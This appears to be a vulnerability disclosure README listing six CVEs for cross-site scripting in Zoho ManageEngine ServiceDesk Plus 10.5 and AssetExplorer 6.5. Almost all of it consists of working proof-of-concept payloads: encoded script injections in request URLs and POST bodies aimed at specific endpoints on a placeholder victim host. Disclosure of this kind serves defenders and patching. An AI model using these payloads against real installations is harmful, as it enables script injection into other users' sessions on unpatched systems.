# Zoho-ManageEngine-XSS

Zoho ManageEngine ServiceDesk Plus and AssetExplorer Cross-Site Scripting (XSS) Vulnerability

**Researcher: Enter of The Tarantula Team, VinCSS (a member of Vingroup)**
 
# CVE-2019-12539 

Zoho ManageEngine ServiceDesk Plus 10.5 Cross-Site Scripting vulnerability

Payload: Sent HTTP POST Request to: https://victim.com/SearchN.do with the following payload:

```
searchText=%27%3E%3Csvg+onload%3Dalert%28%27xss%27%29%3E&subModSelText=&selectName=Purchase&selectName=Purchase&selectedName=Purchase&submitbutton=GO
 ```

# CVE-2019-12540 

Zoho ManageEngine ServiceDesk Plus 10.5 Cross-Site Scripting vulnerability

Payload: 

```
https://victim.com/WorkOrder.do?woMode=viewWO5%27%3balert(%27XSS%27)%2f%2f
``` 

# CVE-2019-12595 

Zoho ManageEngine AssetExplorer 6.5 Cross-Site Scripting vulnerability

Payload: 

```
https://victim.com/RCSettings.do?rdsName=Windows%20Remote%20Desktop%00zc6p3%3Cimg%20src%3da%20onerror%3dalert(%27XSS%27)%3Ekgo&description=This+tool+uses+the+windows+utility+%27mstsc%27+to+take+remote+and+it+is+available+by+default+in+windows+machines.&OS_COMMAND_1=mstsc+%2Fv%3A%24DEVICENAME&OS_TARGET_1_1=1&OS_COMMAND_2=&saveRds=Save&rdsId=2 
 ```

# CVE-2019-12596

Zoho ManageEngine AssetExplorer 6.5 Cross-Site Scripting vulnerability

Payload: 

```
https://victim.com/SoftwareListView.do?softwareManufacturer=-1&site=-1&swType=488529);alert(%27XSS%27)%2f%2f298&swComplianceType=0&fromSoftwareHome=true&showZeroCount=false
 ```
 
# CVE-2019-12597

Zoho ManageEngine AssetExplorer 6.5 Cross-Site Scripting vulnerability 

Payload:

```
https://victim.com/asset/ResourcesAttachments.jsp?type=new&wsID=87&date=1559400074944&pageName=a%22%3E%3Cimg%20src%3da%20onerror%3dalert(%27XSS%27)%3E
```

# CVE-2019-12537 

Zoho ManageEngine AssetExplorer 6.5 Cross-Site Scripting vulnerability 

Payload:

Sent HTTP POST Request to: https://victim.com/SearchN.do with the following payload:

```
selectName=Purchase&searchText=%27%3E%3Csvg+onload%3Dalert%28%27xss%27%29%3E&submitbutton=%C2%A0
```
 
